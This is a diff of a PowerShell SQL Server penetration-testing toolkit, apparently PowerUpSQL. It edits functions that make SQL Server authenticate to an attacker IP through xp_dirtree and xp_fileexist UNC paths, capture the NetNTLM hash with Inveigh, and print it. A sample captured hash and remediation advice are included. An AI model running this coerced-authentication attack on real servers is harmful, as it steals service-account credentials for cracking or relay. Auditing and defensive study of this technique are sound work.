@@ -7963,9 +7963,9 @@ Function  Get-SQLServiceLocal
 
 
 # -------------------------------------------
-# Function:  Create-SQLFile-XPDLL
+# Function:  Create-SQLFileXpDll
 # -------------------------------------------
-function Create-SQLFile-XPDLL
+function Create-SQLFileXpDll
 {
     <#
             .SYNOPSIS
@@ -7981,7 +7981,7 @@ function Create-SQLFile-XPDLL
             .PARAMETER OutFile
             Name of the Dll file to write to. 
             .EXAMPLE
-            PS C:\temp> Create-SQLFile-XPDLL -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
+            PS C:\temp> Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
  
             Creating DLL c:\temp\test.dll
             - Exported function name: xp_test
@@ -9959,9 +9959,29 @@ Function Invoke-SQLAuditPrivXpDirtree
             .PARAMETER Exploit
             Exploit vulnerable issues.  
             .PARAMETER AttackerIp
-            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.                
+            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.          
+            .PARAMETER TimeOut
+            Number of seconds to wait for authentication from target SQL Server.                  
             .EXAMPLE
             PS C:\> Invoke-SQLAuditPrivXpDirtree -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2 
+
+            ComputerName  : SQLServer1
+            Instance      : SQLServer1\STANDARDDEV2014
+            Vulnerability : Excessive Privilege - Execute xp_dirtree
+            Description   : Xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force 
+                            the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized 
+                            access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats 
+                            because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
+            Remediation   : Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public
+            Severity      : Medium
+            IsVulnerable  : Yes
+            IsExploitable : Yes
+            Exploited     : Yes
+            ExploitCmd    : Crack the password hash offline or relay it to another system.
+            Details       : The public principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type = 
+                NetNTLMv1;Hash = SQLSvcAcnt::Domain:0000000000000000400000000000000000000000000000000:1CEC319E75261CEC319E759E7511E1CEC319E753AB7D:
+Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
+Author        : Scott Sutherland (@_nullbind), NetSPI 2016
 
             .EXAMPLE
             PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpDirtree -Verbose 
@@ -9985,7 +10005,7 @@ Function Invoke-SQLAuditPrivXpDirtree
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
         
         [Parameter(Mandatory = $false,
-                ValueFromPipelineByPropertyName = $true,
+        ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,       
 
@@ -10132,19 +10152,19 @@ Function Invoke-SQLAuditPrivXpDirtree
                                 
                                 # Start sniffing for hashes from that IP
                                 Write-Verbose -Message "$Instance : - Start sniffing..." 
-                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null
+                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null
 
                                 # Get IP of current system
                                 if(-not $AttackerIp)
                                 {
                                     $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
-                                        Select-Object -ExpandProperty Ipv4Address |
+                                    Select-Object -ExpandProperty Ipv4Address |
                                     Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
                                 }
 
                                 # Sent unc path to attacker's Ip
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 2 -SuppressVerbose | Out-Null                               
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 10 -SuppressVerbose | Out-Null                               
                                 
                                 # Stop sniffing and print password hashes
                                 Start-Sleep $TimeOut
@@ -10181,13 +10201,13 @@ Function Invoke-SQLAuditPrivXpDirtree
                                     Write-Verbose -Message "$Instance : - Recovered $HashType hash:" 
                                     Write-Verbose -Message "$Instance : - $Hash"
                                     $Exploited = 'Yes'
-                                    $Details = "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash" 
+                                    $Details = "The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash" 
                                 }
                                 else
                                 {
                                     # Update Status    
                                     $Exploited = 'No'
-                                    $Details = "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."   
+                                    $Details = "The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."   
                                 }        
                                 
                                 # Clear inveigh cache
@@ -10198,21 +10218,21 @@ Function Invoke-SQLAuditPrivXpDirtree
                                 Write-Verbose -Message "$Instance : - Inveigh could not be loaded." 
                                 # Update status
                                 $Exploited = 'No'
-                                $Details = "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered." 
+                                $Details = "The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered." 
                             }
                         }
                         else
                         {
                             # Update status
                             $Exploited = 'No'
-                            $Details = "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database."                            
+                            $Details = "The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database."                            
                         }
                     }
                     else
                     {
                         # Update status
                         $IsExploitable  = 'No' 
-                        $Details = "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database."  
+                        $Details = "The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE procedure in the master database."  
                     }
                 }
 
@@ -10261,7 +10281,9 @@ Function Invoke-SQLAuditPrivXpFileexist
             .PARAMETER Exploit
             Exploit vulnerable issues.  
             .PARAMETER AttackerIp
-            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.                
+            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.      
+            .PARAMETER TimeOut
+            Number of seconds to wait for authentication from target SQL Server.                          
             .EXAMPLE
             PS C:\> Invoke-SQLAuditPrivXpFileexist -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2
 
@@ -10446,7 +10468,7 @@ Function Invoke-SQLAuditPrivXpFileexist
 
                                 # Sent unc path to attacker's Ip
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\file'" -TimeOut 2 -SuppressVerbose | Out-Null                               
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\file'" -TimeOut 10 -SuppressVerbose | Out-Null                               
                                 
                                 # Stop sniffing and print password hashes
                                 Start-Sleep $TimeOut
